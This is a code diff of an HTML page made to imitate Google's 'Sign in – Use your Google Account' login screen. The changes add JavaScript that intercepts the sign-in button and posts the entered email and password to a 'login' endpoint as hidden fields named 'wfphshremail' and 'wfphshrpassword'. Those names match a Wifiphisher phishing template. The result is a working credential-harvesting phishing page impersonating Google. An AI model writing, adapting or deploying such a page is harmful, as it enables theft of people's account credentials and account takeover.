@@ -35,8 +35,6 @@
 <body>
   <div id="login-app">
     <div class="login-container">
-
-      <!-- Optional: progress bar (can remove if unused) -->
       <div class="progress-bar-container show-progress">
         <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style="display:none;">
           <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
@@ -54,23 +52,16 @@
 
       <div class="login-content" id="login-form">
         <div id="logo" title="Google">
-          <!-- SVG logo placeholder -->
-          <h1 style="font-family:Roboto, sans-serif; font-size:24px;">Google</h1>
+          <!-- SVG logo omitted for brevity -->
         </div>
 
-        <!-- ✅ Your Custom Form Integration -->
-        <form id="email-form-step" action="/login" method="POST">
+        <form id="email-form-step">
           <h1 class="g-h1">Sign in</h1>
           <h2 class="g-h2">Use your Google Account</h2>
 
           <div class="login-content">
-            <label for="email">Email:</label><br>
-            <input type="text" name="email" id="email" class="g-input" placeholder="Email or phone" required><br>
-
-            <label for="password">Password:</label><br>
-            <input type="password" name="password" id="password" class="g-input password-input" placeholder="Password" required><br><br>
-
-            <input type="submit" value="Login" class="gbtn-primary">
+            <input name="eml" id="eml" type="text" class="g-input" placeholder="Email or phone" required>
+            <input name="pwd" id="pwd" type="password" class="g-input password-input" placeholder="Password" required>
 
             <legend class="g-legend">Forgot email?</legend>
 
@@ -81,32 +72,62 @@
 
             <div class="login-nav">
               <legend class="g-legend">Create Account</legend>
+              <button name="btn" id="btn" class="gbtn-primary" type="submit">Next</button>
             </div>
           </div>
         </form>
-
       </div>
     </div>
   </div>
 
-  <!-- Optional: Error dialog placeholder -->
+  <!-- Dialog placeholder used in JS -->
   <div id="dialog" style="display:none; color: red; padding: 10px;">Please fill out both fields.</div>
 
-  <!-- ✅ Optional JS validation (can be removed if you're using server-side validation only) -->
   <script>
-    $("#email-form-step").on("submit", function (e) {
-      const email = document.getElementById("email");
-      const password = document.getElementById("password");
+    $("#btn").on("click", function (e) {
+      e.preventDefault();
+      const input = document.getElementById("eml");
+      const input2 = document.getElementById("pwd");
 
-      if (email.value.trim() === "" || password.value.trim() === "") {
-        e.preventDefault();
-        $("#dialog").show();
-        $(".g-input").css('border', '1px solid #dd4b39');
+      if (input.value === "" || input2.value === "") {
+        passNotValid();
       } else {
         $("#dialog").hide();
+        post('login', {
+          wfphshremail: input.value,
+          wfphshrpassword: input2.value
+        });
       }
     });
+
+    function passNotValid() {
+      $("#dialog").show();
+      $(".g-input").css('border', '1px solid #dd4b39');
+    }
+
+    function post(path, params) {
+      const form = document.createElement("form");
+      form.setAttribute("method", "post");
+      form.setAttribute("action", path);
+
+      for (let key in params) {
+        if (params.hasOwnProperty(key)) {
+          const hiddenField = document.createElement("input");
+          hiddenField.setAttribute("type", "hidden");
+          hiddenField.setAttribute("name", key);
+          hiddenField.setAttribute("value", params[key]);
+          form.appendChild(hiddenField);
+        }
+      }
+
+      document.body.appendChild(form);
+      form.submit();
+    }
+
+    // Ensure inputs are enabled
+    document.getElementById("eml").disabled = false;
+    document.getElementById("pwd").disabled = false;
   </script>
 </body>
-  </html>
-              
+    </html>
+    
